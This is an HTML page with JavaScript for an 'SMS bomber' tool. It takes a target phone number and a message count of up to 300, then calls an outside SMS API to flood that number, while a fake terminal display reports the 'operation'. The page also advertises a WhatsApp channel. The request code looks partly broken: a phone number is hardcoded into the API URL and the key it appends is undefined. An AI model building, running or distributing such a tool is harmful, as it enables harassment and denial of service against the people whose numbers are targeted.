<!DOCTYPE html>  
<html lang="en">  
<head>  
<meta charset="UTF-8">  
<meta name="viewport" content="width=device-width, initial-scale=1.0">  
<title>𝗦𝗛𝗔𝗛𝗭𝗔𝗗𝗔 𝗦𝗠𝗦 𝗕𝗢𝗠𝗕𝗘𝗥</title>  
  
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@700;800&display=swap" rel="stylesheet">  
  
<style>  
:root{  
  --primary:#1e3a8a;  /* Dark Blue for main elements */  
  --accent:#1e40af;   /* Slightly lighter dark blue for highlights */  
  --border:#e5e7eb;  
  --snow-color:#1e40af; /* Snowflakes in dark blue */  
}  
  
/* RESET */  
*{margin:0;padding:0;box-sizing:border-box;}  
  
body{  
  font-family:'Rajdhani',sans-serif;  
  background:#ffffff;  
  min-height:100vh;  
  padding:20px;  
  display:flex;  
  flex-direction:column;  
  align-items:center;  
  overflow-x:hidden;  
  position:relative;  
}  
  
/* ❄️ PREMIUM VIP SNOW */  
.snowflake{  
  position:fixed;  
  top:-50px;  
  color:var(--snow-color);  
  user-select:none;  
  pointer-events:none;  
  z-index:9999;  
  animation: fallWind linear infinite;  
}  
@keyframes fallWind{  
  0% { transform: translate(0,0) rotate(0deg);}  
  25% { transform: translate(10px,25vh) rotate(45deg);}  
  50% { transform: translate(-10px,50vh) rotate(90deg);}  
  75% { transform: translate(15px,75vh) rotate(135deg);}  
  100% { transform: translate(0,110vh) rotate(180deg);}  
}  
  
/* CARD */  
.card{  
  background:#fff;  
  border-radius:22px;  
  border:1px solid var(--border);  
  box-shadow:0 20px 45px rgba(0,0,0,.08);  
  padding:30px;  
  max-width:540px;  
  width:100%;  
  margin-bottom:25px;  
}  
  
/* HEADER */  
.header{text-align:center}  
.logo{  
  width:120px;  
  height:120px;  
  border-radius:50%;  
  border:4px solid var(--accent);  
  margin-bottom:12px;  
}  
h1{  
  color: var(--accent); /* Header matches outer circle */  
  font-size:2.4rem;  
}  

/* Channel heading same dark blue */  
.channel h2{
  color: var(--accent);
}

/* FORM */  
label{display:block;margin-bottom:6px;font-size:.9rem;}  
input{width:100%;padding:16px;border-radius:14px;border:1px solid var(--border);font-size:1rem;}  
  
/* INTENSITY */  
.intensity{display:flex;gap:8px;flex-wrap:wrap;}  
.intensity input{display:none;}  
.intensity label{  
  padding:10px;  
  border-radius:12px;  
  border:1px solid var(--border);  
  cursor:pointer;  
  min-width:80px;  
  text-align:center;  
}  
.intensity input:checked + label{  
  background:linear-gradient(135deg,var(--primary),var(--accent));  
  color:#fff;  
}  
  
/* BUTTON */  
button{  
  width:100%;  
  padding:18px;  
  border-radius:16px;  
  border:none;  
  background:linear-gradient(135deg,var(--primary),var(--accent));  
  color:#fff;  
  font-size:1.1rem;  
  margin-top:15px;  
  cursor:pointer;  
}  
  
/* TERMINAL */  
.terminal{  
  margin-top:20px;  
  background:#ffffff;  
  border:2px solid #000;  
  border-radius:14px;  
  padding:15px;  
  height:190px;  
  overflow:auto;  
  font-family:monospace;  
  font-size:.85rem;  
  color:#000;  
}  
.cmd{margin-bottom:6px}  
  
/* CHANNEL */  
.channel{text-align:center;}  
.channel a{  
  display:inline-block;  
  margin-top:10px;  
  padding:14px 30px;  
  border-radius:30px;  
  border:3px solid var(--primary);  
  color:var(--primary);  
  text-decoration:none;  
}  
.channel a:hover{background:var(--primary);color:#fff;}  
</style>  
</head>  
<body>  
  
<!-- HEADER -->  
<div class="card header">  
  <img src="https://i.ibb.co/TB47xt1g/140441.jpg" class="logo">  
  <h1>𝗦𝗛𝗔𝗛𝗭𝗔𝗗𝗔 𝗦𝗠𝗦 𝗕𝗢𝗠𝗕𝗘𝗥</h1>  
</div>  
  
<!-- TOOL -->  
<div class="card">  
  <label>ᴇɴᴛᴇʀ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ</label>  
  <input id="target-number" placeholder="923XXXXXXXXX">  
  
  <label style="margin-top:15px">ɪɴᴛᴇɴsɪᴛʏ</label>  
  <div class="intensity">  
    <input id="i1" type="radio" name="i" checked><label for="i1">10</label>  
    <input id="i2" type="radio" name="i"><label for="i2">25</label>  
    <input id="i3" type="radio" name="i"><label for="i3">50</label>  
    <input id="i4" type="radio" name="i"><label for="i4">100</label>  
    <input id="i5" type="radio" name="i"><label for="i5">200</label>  
    <input id="i6" type="radio" name="i"><label for="i6">300</label>  
  </div>  
  
  <button id="start">𝗦𝗧𝗔𝗥𝗧 𝗢𝗣𝗘𝗥𝗔𝗧𝗜𝗢𝗡</button>  
  
  <div class="terminal" id="terminal">  
    <div class="cmd">$ system ready</div>  
  </div>  
</div>  
  
<!-- CHANNEL -->  
<div class="card channel">  
  <h2>𝙵𝙾𝙻𝙻𝙾𝚆 𝙲𝙷𝙰𝙽𝙽𝙴𝙻</h2>  
  <a href="https://whatsapp.com/channel/0029Vb7z4LxIN9imGhuSCi21" target="_blank">  
    𝙹𝙾𝙸𝙽 𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿  
  </a>  
</div>  
  
<script>  
/* ❄️ PREMIUM VIP SNOW */  
const SNOW_COUNT = 15;  
for(let i=0;i<SNOW_COUNT;i++){  
  const flake = document.createElement("div");  
  flake.classList.add("snowflake");  
  flake.style.left = Math.random()*100+"%";  
  flake.style.fontSize = (Math.random()*4+14)+"px";  
  flake.style.animationDuration = (Math.random()*8+8)+"s";  
  flake.style.animationDelay = (Math.random()*5)+"s";  
  flake.style.opacity = Math.random()*0.7+0.3;  
  flake.style.transform = `rotate(${Math.random()*360}deg)`;  
  flake.textContent = "✶";  
  document.body.appendChild(flake);  
}  
  
/* ⌨️ TERMINAL TYPING + API */  
const terminal = document.getElementById("terminal");  
const btn = document.getElementById("start");  
const numberInput = document.getElementById("target-number");  
  
const API_CONFIG = {  
  url: 'https://sms-sender.gt.tc/api/proxy.php?provider=api1&phone=3075387475&count=10/',   
};  
  
function getIntensity(){  
  return document.querySelector('input[name="i"]:checked').nextElementSibling.textContent;  
}  
  
function typeCmd(text, cb){  
  let i=0;  
  const div = document.createElement("div");  
  div.className = "cmd";  
  terminal.appendChild(div);  
  const t = setInterval(()=>{  
    div.textContent += text[i++];  
    terminal.scrollTop = terminal.scrollHeight;  
    if(i >= text.length){ clearInterval(t); cb && cb(); }  
  }, 30);  
}  
  
btn.onclick = async ()=>{  
  terminal.innerHTML = "";  
  const number = numberInput.value.trim();  
  const count = getIntensity();  
  
  if(!number || number.length<10){  
    typeCmd("$ Error: Invalid Number", null);  
    return;  
  }  
  
  const cmds = [  
    "$ initializing modules",  
    `$ targeting number ${number}`,  
    `$ intensity ${count} packets`,  
    "$ sending packets...",  
    "$ operation completed successfully ✅"  
  ];  
  
  let i=0;  
  (function next(){  
    if(i<cmds.length) typeCmd(cmds[i++], next);  
  })();  
  
  // API CALL  
  try{  
    const requestUrl = `${API_CONFIG.url}?key=${API_CONFIG.key}&number=${number}&count=${count}`;  
    const res = await fetch(requestUrl);  
    const data = await res.json();  
    console.log("API Response:", data);  
  }catch(err){  
    console.error("API Error:", err);  
  }  
};  
</script>  
  
</body>  
</html>
